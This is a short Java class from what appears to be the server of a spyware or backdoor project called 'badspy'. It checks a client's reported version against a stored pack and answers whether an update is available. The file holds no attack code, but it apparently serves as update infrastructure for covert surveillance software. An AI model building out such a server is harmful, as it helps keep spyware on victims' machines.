package com.blogspot.sontx.badspy.badserver.bo.bdrworker;

import com.blogspot.sontx.badspy.badserver.bean.Pack;
import com.blogspot.sontx.badspy.badserver.bean.Version;
import com.blogspot.sontx.badspy.badserver.bo.Receiver;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
import com.blogspot.sontx.jlog.Log;

import javax.naming.InvalidNameException;
import java.io.IOException;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 25/4/2016.
 */
public class BdrUpdateReceiver extends Receiver {

    public BdrUpdateReceiver(SpyReader reader, SpyWriter writer, int dataLength) {
        super(reader, writer, dataLength);
    }

    @Override
    public void start() throws IOException {
        byte[] buffer = new byte[dataLength];
        if (reader.read(buffer) == buffer.length) {
            Version version = Version.parse(buffer);
            if (version != null) {
                Pack pack = BdrPackManager.getPackById(0);
                if (pack != null) {
                    boolean available = version.compare(pack.getVersion()) < 0;
                    writer.write(available ? BdrWorker.FLAG_YES : BdrWorker.FLAG_NO);
                } else {
                    writer.write(BdrWorker.FLAG_NO);
                }
            }
        }
    }
}
